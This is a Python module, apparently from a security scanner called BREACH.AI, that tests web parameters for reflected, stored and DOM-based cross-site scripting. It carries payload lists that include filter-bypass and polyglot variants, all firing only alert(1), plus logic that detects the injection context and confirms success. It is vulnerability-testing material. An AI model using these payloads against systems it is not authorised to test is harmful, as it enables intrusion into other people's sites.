"""
BREACH.AI - Cross-Site Scripting (XSS) Attack Module

Tests for:
- Reflected XSS
- Stored XSS indicators
- DOM-based XSS
"""

import re
from typing import Optional
from urllib.parse import quote

from backend.breach.attacks.base import AttackResult, BaseAttack
from backend.breach.core.memory import Severity
from backend.breach.utils.http import HTTPClient, HTTPResponse
from backend.breach.utils.logger import logger


class XSSAttack(BaseAttack):
    """
    Cross-Site Scripting (XSS) attack module.

    Tests for reflected XSS by injecting payloads and checking
    if they appear unescaped in the response.
    """

    name = "Cross-Site Scripting"
    attack_type = "xss"
    description = "Tests for XSS vulnerabilities"
    severity = Severity.HIGH
    owasp_category = "A03:2021 Injection"
    cwe_id = 79

    # Basic XSS payloads
    BASIC_PAYLOADS = [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        '<img src=x onerror=alert(1)>',
        '"><img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><svg onload=alert(1)>',
        "javascript:alert(1)",
        '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
    ]

    # Event handler payloads
    EVENT_PAYLOADS = [
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)'",
        '" onfocus="alert(1)" autofocus="',
        "' onfocus='alert(1)' autofocus='",
        '" onload="alert(1)',
        '<div onmouseover="alert(1)">hover</div>',
        '<input onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
    ]

    # Filter bypass payloads
    BYPASS_PAYLOADS = [
        '<ScRiPt>alert(1)</sCrIpT>',  # Case variation
        '<scr<script>ipt>alert(1)</scr</script>ipt>',  # Nested
        '<script>alert(String.fromCharCode(88,83,83))</script>',  # Encoding
        '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',  # Hex encoding
        '<script>al\\u0065rt(1)</script>',  # Unicode
        '<script>eval(atob("YWxlcnQoMSk="))</script>',  # Base64
        '<img src=x onerror=alert`1`>',  # Template literal
        '<svg/onload=alert(1)>',  # No space
        '<script>alert(1)//</script>',  # Comment
        '{{constructor.constructor("alert(1)")()}}',  # Template injection
    ]

    # DOM XSS payloads (for URL fragments)
    DOM_PAYLOADS = [
        '#<script>alert(1)</script>',
        '#"><script>alert(1)</script>',
        '#javascript:alert(1)',
        '#" onclick=alert(1)//',
    ]

    # Polyglot payloads (work in multiple contexts)
    POLYGLOT_PAYLOADS = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
        "'-alert(1)-'",
        '">><marquee><img src=x onerror=confirm(1)></marquee>',
        "'\"-->]]>*/</script><script>alert(1)</script>",
    ]

    # Unique marker for detection
    MARKER = "BREACHXSS"

    def get_payloads(self) -> list[str]:
        """Get all XSS payloads."""
        return (
            self.BASIC_PAYLOADS +
            self.EVENT_PAYLOADS[:5] +
            self.BYPASS_PAYLOADS[:5] +
            self.POLYGLOT_PAYLOADS
        )

    async def check(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> bool:
        """Quick check for XSS vulnerability."""
        if not parameter:
            return False

        # Try basic payloads with unique marker
        marker_payloads = [
            f'<script>{self.MARKER}</script>',
            f'"><script>{self.MARKER}</script>',
            f'{self.MARKER}',
        ]

        for payload in marker_payloads:
            response = await self._send_payload(url, parameter, payload, method)

            # Check if payload appears unescaped
            if self._is_reflected_unescaped(payload, response.body):
                return True

        return False

    async def exploit(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> AttackResult:
        """Full XSS exploitation attempt."""
        if not parameter:
            return self._create_result(False, url, parameter)

        result = self._create_result(False, url, parameter)

        # Step 1: Detect injection context
        context = await self._detect_context(url, parameter, method)
        result.context["xss_context"] = context

        # Step 2: Select payloads based on context
        payloads = self._get_context_payloads(context)

        # Step 3: Try payloads
        for payload in payloads:
            response = await self._send_payload(url, parameter, payload, method)

            if self._is_xss_successful(payload, response.body, context):
                result.success = True
                result.payload = payload
                result.response = response.body[:2000]
                result.details = f"Reflected XSS in {context} context"

                # Add evidence
                result.add_evidence(
                    "xss_payload",
                    f"Working XSS payload in {context} context",
                    payload
                )

                # Check if it's stored (makes another request without payload)
                is_stored = await self._check_stored(url, parameter, payload, method)
                if is_stored:
                    result.details = f"Stored XSS in {context} context"
                    result.severity = Severity.CRITICAL

                break

        # Step 4: Try filter bypasses if basic payloads failed
        if not result.success:
            for payload in self.BYPASS_PAYLOADS:
                response = await self._send_payload(url, parameter, payload, method)

                if self._is_xss_successful(payload, response.body, context):
                    result.success = True
                    result.payload = payload
                    result.details = f"XSS with filter bypass in {context} context"
                    result.add_evidence(
                        "xss_bypass",
                        "Filter bypass successful",
                        payload
                    )
                    break

        return result

    async def _detect_context(
        self,
        url: str,
        parameter: str,
        method: str
    ) -> str:
        """Detect where the input is reflected (HTML, attribute, script, etc.)."""
        marker = f"BREACH{hash(url) % 10000}"
        response = await self._send_payload(url, parameter, marker, method)

        body = response.body

        # Find where the marker appears
        marker_pos = body.find(marker)
        if marker_pos == -1:
            return "not_reflected"

        # Get surrounding context
        start = max(0, marker_pos - 100)
        end = min(len(body), marker_pos + len(marker) + 100)
        context_snippet = body[start:end].lower()

        # Check context type
        if f'<script' in context_snippet and '</script>' in body[marker_pos:]:
            return "script"
        elif f'"{marker.lower()}"' in context_snippet or f"'{marker.lower()}'" in context_snippet:
            return "attribute_quoted"
        elif re.search(r'<\w+[^>]*' + marker.lower(), context_snippet):
            return "attribute_unquoted"
        elif f'<!--' in context_snippet:
            return "comment"
        elif f'<style' in context_snippet:
            return "style"
        else:
            return "html"

    def _get_context_payloads(self, context: str) -> list[str]:
        """Get payloads optimized for the detected context."""
        if context == "script":
            return [
                "';alert(1)//",
                '";alert(1)//',
                "</script><script>alert(1)</script>",
                "-alert(1)-",
                "alert(1)",
            ] + self.BASIC_PAYLOADS

        elif context == "attribute_quoted":
            return self.EVENT_PAYLOADS + [
                '" onmouseover="alert(1)" x="',
                "' onmouseover='alert(1)' x='",
                '"><script>alert(1)</script>',
                "'><script>alert(1)</script>",
            ]

        elif context == "attribute_unquoted":
            return [
                ' onmouseover=alert(1) ',
                ' onfocus=alert(1) autofocus ',
                '><script>alert(1)</script>',
            ] + self.EVENT_PAYLOADS

        elif context == "comment":
            return [
                '--><script>alert(1)</script><!--',
                '--!><script>alert(1)</script>',
            ]

        elif context == "style":
            return [
                '</style><script>alert(1)</script>',
                'expression(alert(1))',
            ]

        else:  # HTML context
            return self.BASIC_PAYLOADS + self.POLYGLOT_PAYLOADS

    def _is_reflected_unescaped(self, payload: str, body: str) -> bool:
        """Check if payload is reflected without proper escaping."""
        # Check for exact reflection
        if payload in body:
            return True

        # Check for partial reflection of dangerous parts
        dangerous_parts = ['<script', 'onerror=', 'onload=', 'onclick=', '<svg', '<img']
        for part in dangerous_parts:
            if part.lower() in payload.lower() and part.lower() in body.lower():
                return True

        return False

    def _is_xss_successful(self, payload: str, body: str, context: str) -> bool:
        """Check if XSS payload was successful."""
        # Check if our payload appears unescaped
        if payload in body:
            return True

        # Check for specific indicators based on context
        body_lower = body.lower()
        payload_lower = payload.lower()

        # Script tags
        if '<script' in payload_lower and '<script' in body_lower:
            # Make sure it's not escaped
            if '&lt;script' not in body_lower:
                return True

        # Event handlers
        event_handlers = ['onclick', 'onerror', 'onload', 'onmouseover', 'onfocus']
        for handler in event_handlers:
            if handler in payload_lower and handler + '=' in body_lower:
                return True

        # SVG/IMG tags
        if ('<svg' in payload_lower or '<img' in payload_lower) and 'onerror' in payload_lower:
            if '<svg' in body_lower or '<img' in body_lower:
                if 'onerror=' in body_lower:
                    return True

        return False

    async def _check_stored(
        self,
        url: str,
        parameter: str,
        payload: str,
        method: str
    ) -> bool:
        """Check if XSS is stored by making a clean request."""
        # Make a fresh request without the payload
        response = await self.http_client.get(url)

        # Check if our payload appears in the response
        return payload in response.body
